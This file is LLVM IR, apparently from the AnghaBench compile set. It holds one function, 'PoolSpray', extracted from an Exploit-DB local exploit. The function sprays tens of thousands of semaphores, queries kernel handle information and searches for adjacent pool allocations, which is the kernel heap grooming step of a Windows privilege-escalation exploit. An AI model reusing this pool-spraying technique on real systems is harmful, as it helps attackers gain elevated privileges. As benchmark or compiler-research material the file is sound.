; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_40164.c_PoolSpray.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_40164.c_PoolSpray.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_6__ = type { i64, %struct.TYPE_5__* }
%struct.TYPE_5__ = type { i32, i32, i32* }

@.str = private unnamed_addr constant [10 x i32] [i32 110, i32 116, i32 100, i32 108, i32 108, i32 46, i32 100, i32 108, i32 108, i32 0], align 4
@.str.1 = private unnamed_addr constant [25 x i8] c"NtQuerySystemInformation\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"Such a fail...\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"\09[+] Spawned lots of semaphores\0A\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"\09[.] Initing pool windows\0A\00", align 1
@MEM_COMMIT = common dso_local global i32 0, align 4
@PAGE_READWRITE = common dso_local global i32 0, align 4
@SystemExtendedHandleInformation = common dso_local global i32 0, align 4
@STATUS_SUCCESS = common dso_local global i64 0, align 8
@MEM_RELEASE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [28 x i8] c"\09[+] Window found at %08X!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @PoolSpray() #0 {
  %1 = alloca i64 (i32, i32, i32, i32*)*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca [48 x i32*], align 16
  %9 = alloca i32, align 4
  %10 = alloca %struct.TYPE_6__*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32*, align 8
  %21 = alloca i32, align 4
  %22 = call i32 @GetModuleHandle(i8* bitcast ([10 x i32]* @.str to i8*))
  %23 = call i32 @GetProcAddress(i32 %22, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %24 = sext i32 %23 to i64
  %25 = inttoptr i64 %24 to i64 (i32, i32, i32, i32*)*
  store i64 (i32, i32, i32, i32*)* %25, i64 (i32, i32, i32, i32*)** %1, align 8
  %26 = load i64 (i32, i32, i32, i32*)*, i64 (i32, i32, i32, i32*)** %1, align 8
  %27 = icmp eq i64 (i32, i32, i32, i32*)* %26, null
  br i1 %27, label %28, label %30

28:                                               ; preds = %0
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  br label %244

30:                                               ; preds = %0
  store i32 0, i32* %2, align 4
  %31 = call i32 (...) @GetVersion()
  %32 = call i32 @LOBYTE(i32 %31)
  %33 = icmp eq i32 %32, 5
  br i1 %33, label %34, label %35

34:                                               ; preds = %30
  store i32 56, i32* %2, align 4
  br label %41

35:                                               ; preds = %30
  %36 = call i32 (...) @GetVersion()
  %37 = call i32 @LOBYTE(i32 %36)
  %38 = icmp eq i32 %37, 6
  br i1 %38, label %39, label %40

39:                                               ; preds = %35
  store i32 72, i32* %2, align 4
  br label %40

40:                                               ; preds = %39, %35
  br label %41

41:                                               ; preds = %40, %34
  store i32 0, i32* %3, align 4
  br label %42

42:                                               ; preds = %50, %41
  %43 = load i32, i32* %3, align 4
  %44 = icmp ult i32 %43, 50000
  br i1 %44, label %45, label %53

45:                                               ; preds = %42
  %46 = call i32* @CreateSemaphore(i32* null, i32 0, i32 3, i32* null)
  store i32* %46, i32** %4, align 8
  %47 = load i32*, i32** %4, align 8
  %48 = icmp eq i32* %47, null
  br i1 %48, label %49, label %50

49:                                               ; preds = %45
  br label %53

50:                                               ; preds = %45
  %51 = load i32, i32* %3, align 4
  %52 = add i32 %51, 1
  store i32 %52, i32* %3, align 4
  br label %42

53:                                               ; preds = %49, %42
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  %56 = call i32 @Sleep(i32 2000)
  store i32 4096, i32* %5, align 4
  store i64 4294967295, i64* %6, align 8
  %57 = load i32, i32* @MEM_COMMIT, align 4
  %58 = load i32, i32* @PAGE_READWRITE, align 4
  %59 = call i32 @VirtualAlloc(i32* null, i32 4096, i32 %57, i32 %58)
  store i32 %59, i32* %7, align 4
  br label %60

60:                                               ; preds = %53, %80
  %61 = load i64 (i32, i32, i32, i32*)*, i64 (i32, i32, i32, i32*)** %1, align 8
  %62 = load i32, i32* @SystemExtendedHandleInformation, align 4
  %63 = load i32, i32* %7, align 4
  %64 = load i32, i32* %5, align 4
  %65 = call i64 %61(i32 %62, i32 %63, i32 %64, i32* null)
  store i64 %65, i64* %6, align 8
  %66 = load i64, i64* %6, align 8
  %67 = load i64, i64* @STATUS_SUCCESS, align 8
  %68 = icmp ne i64 %66, %67
  br i1 %68, label %69, label %79

69:                                               ; preds = %60
  %70 = load i32, i32* %5, align 4
  %71 = mul nsw i32 %70, 2
  store i32 %71, i32* %5, align 4
  %72 = load i32, i32* %7, align 4
  %73 = load i32, i32* @MEM_RELEASE, align 4
  %74 = call i32 @VirtualFree(i32 %72, i32 0, i32 %73)
  %75 = load i32, i32* %5, align 4
  %76 = load i32, i32* @MEM_COMMIT, align 4
  %77 = load i32, i32* @PAGE_READWRITE, align 4
  %78 = call i32 @VirtualAlloc(i32* null, i32 %75, i32 %76, i32 %77)
  store i32 %78, i32* %7, align 4
  br label %80

79:                                               ; preds = %60
  br label %81

80:                                               ; preds = %69
  br label %60

81:                                               ; preds = %79
  %82 = bitcast [48 x i32*]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %82, i8 0, i64 384, i1 false)
  %83 = call i32 (...) @GetCurrentProcessId()
  store i32 %83, i32* %9, align 4
  %84 = load i32, i32* %7, align 4
  %85 = sext i32 %84 to i64
  %86 = inttoptr i64 %85 to %struct.TYPE_6__*
  store %struct.TYPE_6__* %86, %struct.TYPE_6__** %10, align 8
  store i64 0, i64* %11, align 8
  br label %87

87:                                               ; preds = %237, %81
  %88 = load i64, i64* %11, align 8
  %89 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %90 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %89, i32 0, i32 0
  %91 = load i64, i64* %90, align 8
  %92 = icmp ult i64 %88, %91
  br i1 %92, label %93, label %240

93:                                               ; preds = %87
  %94 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %95 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %94, i32 0, i32 1
  %96 = load %struct.TYPE_5__*, %struct.TYPE_5__** %95, align 8
  %97 = load i64, i64* %11, align 8
  %98 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %96, i64 %97
  %99 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %98, i32 0, i32 2
  %100 = load i32*, i32** %99, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = inttoptr i64 %102 to i32*
  %104 = icmp eq i32* %100, %103
  br i1 %104, label %105, label %236

105:                                              ; preds = %93
  %106 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %107 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %106, i32 0, i32 1
  %108 = load %struct.TYPE_5__*, %struct.TYPE_5__** %107, align 8
  %109 = load i64, i64* %11, align 8
  %110 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %108, i64 %109
  %111 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  store i32 %112, i32* %12, align 4
  %113 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %114 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %113, i32 0, i32 1
  %115 = load %struct.TYPE_5__*, %struct.TYPE_5__** %114, align 8
  %116 = load i64, i64* %11, align 8
  %117 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %115, i64 %116
  %118 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 8
  store i32 %119, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %120 = load i32, i32* %2, align 4
  %121 = sdiv i32 536, %120
  %122 = load i32, i32* %2, align 4
  %123 = srem i32 536, %122
  %124 = icmp ne i32 %123, 0
  %125 = zext i1 %124 to i64
  %126 = select i1 %124, i32 1, i32 0
  %127 = add nsw i32 %121, %126
  store i32 %127, i32* %16, align 4
  %128 = load i32, i32* %12, align 4
  %129 = and i32 %128, 4095
  %130 = icmp ne i32 %129, 0
  br i1 %130, label %131, label %235

131:                                              ; preds = %105
  %132 = load i32, i32* %12, align 4
  %133 = add nsw i32 %132, 768
  %134 = and i32 %133, 61440
  %135 = load i32, i32* %12, align 4
  %136 = and i32 %135, 61440
  %137 = icmp eq i32 %134, %136
  br i1 %137, label %138, label %235

138:                                              ; preds = %131
  %139 = load i32, i32* %12, align 4
  %140 = load i32, i32* %2, align 4
  %141 = sub nsw i32 %139, %140
  store i32 %141, i32* %17, align 4
  %142 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %143 = load i32, i32* %17, align 4
  %144 = call i32* @LookupObjectHandle(%struct.TYPE_6__* %142, i32 %143)
  %145 = icmp eq i32* %144, null
  br i1 %145, label %146, label %147

146:                                              ; preds = %138
  br label %237

147:                                              ; preds = %138
  store i32 1, i32* %18, align 4
  br label %148

148:                                              ; preds = %225, %147
  %149 = load i32, i32* %18, align 4
  %150 = load i32, i32* %16, align 4
  %151 = icmp ult i32 %149, %150
  br i1 %151, label %152, label %228

152:                                              ; preds = %148
  %153 = load i32, i32* %12, align 4
  %154 = load i32, i32* %18, align 4
  %155 = load i32, i32* %2, align 4
  %156 = mul i32 %154, %155
  %157 = add i32 %153, %156
  store i32 %157, i32* %19, align 4
  %158 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %159 = load i32, i32* %19, align 4
  %160 = call i32* @LookupObjectHandle(%struct.TYPE_6__* %158, i32 %159)
  store i32* %160, i32** %20, align 8
  %161 = load i32*, i32** %20, align 8
  %162 = icmp ne i32* %161, null
  br i1 %162, label %163, label %221

163:                                              ; preds = %152
  %164 = load i32*, i32** %20, align 8
  %165 = load i32, i32* %18, align 4
  %166 = zext i32 %165 to i64
  %167 = getelementptr inbounds [48 x i32*], [48 x i32*]* %8, i64 0, i64 %166
  store i32* %164, i32** %167, align 8
  %168 = load i32, i32* %18, align 4
  %169 = load i32, i32* %16, align 4
  %170 = sub i32 %169, 1
  %171 = icmp eq i32 %168, %170
  br i1 %171, label %172, label %220

172:                                              ; preds = %163
  %173 = load i32, i32* %12, align 4
  %174 = load i32, i32* %18, align 4
  %175 = add i32 %174, 1
  %176 = load i32, i32* %2, align 4
  %177 = mul i32 %175, %176
  %178 = add i32 %173, %177
  store i32 %178, i32* %19, align 4
  %179 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %180 = load i32, i32* %19, align 4
  %181 = call i32* @LookupObjectHandle(%struct.TYPE_6__* %179, i32 %180)
  %182 = icmp ne i32* %181, null
  br i1 %182, label %183, label %216

183:                                              ; preds = %172
  %184 = load i32, i32* %13, align 4
  %185 = sext i32 %184 to i64
  %186 = inttoptr i64 %185 to i32*
  %187 = getelementptr inbounds [48 x i32*], [48 x i32*]* %8, i64 0, i64 0
  store i32* %186, i32** %187, align 16
  store i32 1, i32* %15, align 4
  %188 = load i32, i32* %12, align 4
  store i32 %188, i32* %14, align 4
  store i32 0, i32* %21, align 4
  br label %189

189:                                              ; preds = %212, %183
  %190 = load i32, i32* %21, align 4
  %191 = load i32, i32* %16, align 4
  %192 = icmp ult i32 %190, %191
  br i1 %192, label %193, label %215

193:                                              ; preds = %189
  %194 = load i32, i32* %21, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [48 x i32*], [48 x i32*]* %8, i64 0, i64 %195
  %197 = load i32*, i32** %196, align 8
  %198 = icmp ne i32* %197, null
  br i1 %198, label %199, label %211

199:                                              ; preds = %193
  %200 = load i32, i32* %21, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds [48 x i32*], [48 x i32*]* %8, i64 0, i64 %201
  %203 = load i32*, i32** %202, align 8
  %204 = call i32 @CloseHandle(i32* %203)
  %205 = load %struct.TYPE_6__*, %struct.TYPE_6__** %10, align 8
  %206 = load i32, i32* %21, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [48 x i32*], [48 x i32*]* %8, i64 0, i64 %207
  %209 = load i32*, i32** %208, align 8
  %210 = call i32 @CloseTableHandle(%struct.TYPE_6__* %205, i32* %209)
  br label %211

211:                                              ; preds = %199, %193
  br label %212

212:                                              ; preds = %211
  %213 = load i32, i32* %21, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %21, align 4
  br label %189

215:                                              ; preds = %189
  br label %219

216:                                              ; preds = %172
  %217 = getelementptr inbounds [48 x i32*], [48 x i32*]* %8, i64 0, i64 0
  %218 = call i32 @memset(i32** %217, i32 0, i32 384)
  br label %228

219:                                              ; preds = %215
  br label %220

220:                                              ; preds = %219, %163
  br label %224

221:                                              ; preds = %152
  %222 = getelementptr inbounds [48 x i32*], [48 x i32*]* %8, i64 0, i64 0
  %223 = call i32 @memset(i32** %222, i32 0, i32 384)
  br label %228

224:                                              ; preds = %220
  br label %225

225:                                              ; preds = %224
  %226 = load i32, i32* %18, align 4
  %227 = add i32 %226, 1
  store i32 %227, i32* %18, align 4
  br label %148

228:                                              ; preds = %221, %216, %148
  %229 = load i32, i32* %15, align 4
  %230 = icmp ne i32 %229, 0
  br i1 %230, label %231, label %234

231:                                              ; preds = %228
  %232 = load i32, i32* %14, align 4
  %233 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0), i32 %232)
  br label %234

234:                                              ; preds = %231, %228
  br label %235

235:                                              ; preds = %234, %131, %105
  br label %236

236:                                              ; preds = %235, %93
  br label %237

237:                                              ; preds = %236, %146
  %238 = load i64, i64* %11, align 8
  %239 = add i64 %238, 1
  store i64 %239, i64* %11, align 8
  br label %87

240:                                              ; preds = %87
  %241 = load i32, i32* %7, align 4
  %242 = load i32, i32* @MEM_RELEASE, align 4
  %243 = call i32 @VirtualFree(i32 %241, i32 0, i32 %242)
  br label %244

244:                                              ; preds = %240, %28
  ret void
}

declare dso_local i32 @GetProcAddress(i32, i8*) #1

declare dso_local i32 @GetModuleHandle(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @LOBYTE(i32) #1

declare dso_local i32 @GetVersion(...) #1

declare dso_local i32* @CreateSemaphore(i32*, i32, i32, i32*) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @VirtualAlloc(i32*, i32, i32, i32) #1

declare dso_local i32 @VirtualFree(i32, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @GetCurrentProcessId(...) #1

declare dso_local i32* @LookupObjectHandle(%struct.TYPE_6__*, i32) #1

declare dso_local i32 @CloseHandle(i32*) #1

declare dso_local i32 @CloseTableHandle(%struct.TYPE_6__*, i32*) #1

declare dso_local i32 @memset(i32**, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
